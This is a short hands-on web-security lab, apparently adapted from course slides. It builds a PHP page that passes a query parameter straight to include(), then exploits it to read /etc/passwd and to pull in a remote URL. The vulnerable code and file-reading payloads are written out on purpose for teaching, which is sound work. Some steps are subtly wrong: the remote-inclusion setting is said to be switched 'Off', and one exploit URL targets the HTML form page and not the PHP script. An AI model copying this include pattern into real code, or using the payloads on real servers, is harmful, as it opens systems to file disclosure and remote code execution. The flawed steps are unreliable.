Local File Inclusion (LFI) and Remote File Inclusion (RFI) example

This example is derived from CyberAces Module 3, Basic Web Security, slide 5.

This is a blank html script that we will use for demonstrating LFI and RFI.  Paste it into gedit and save it as /var/www/html/LFItest.html
<html>
<title> LFI Example </title>
<body>
<h4 LFI Example </h4>
This site has two pages, 1 and 2
<br>
<br>
<form action="getpage.php" method="get"> 
Enter 1 or 2: <input name="Page" type="text" /> 
<input type="submit" />
</form>
</body></html>

Now, let's create simple pages to view.

Paste this into 1:
<?php
echo "this is page 1";
?>

Paste this into 2:
<?php
echo "this is page 2";
?>

This is the php script called by the html form, LFItest.html.  Paste it into a file called getpage.php
<?php
include($_GET['Page']);
?>

All of the above files (LFItest.html, 1, 2, and getpage.php) should be in your /var/www/html directory.

When you point your browser to http://localhost/LFItest.html, you should see a page asking you to enter a page number (see LFIwithPage1.PNG). If you don't see anything, make sure your httpd service is running (su -; service httpd start). Note the URL is http://localhost/LFItest.html/?Page=1.php  Hmmm, what happens if we edit the URL...

http://localhost/LFItest.html/?Page=/etc/passwd

Yikes!  (see LFIexploited.PNG)

RFI
To do this, we first have to disable the php protection against including URLs.  Open php.ini
su -
gedit /etc/php.ini
Search for allow_url_include and change it to Off.  Save the file.  Then restart the web server.
service httpd restart

Now edit the URL to change it from http://localhost/getpage.php?Page=1.php to
http://localhost/getpage.php?Page=http://php.net/manual/en/function.file.php

Yikes!  (see RFIexploited.PNG)

Note:  I just grabbed the first php page I found in the Internet.  This could just as easily be an evil script on a bad guy's evil server.

This can also be done with POST, it's just slightly more work to edit the URL.  The simplest way to do it is to add the TamperData tool to your Firefox browser.
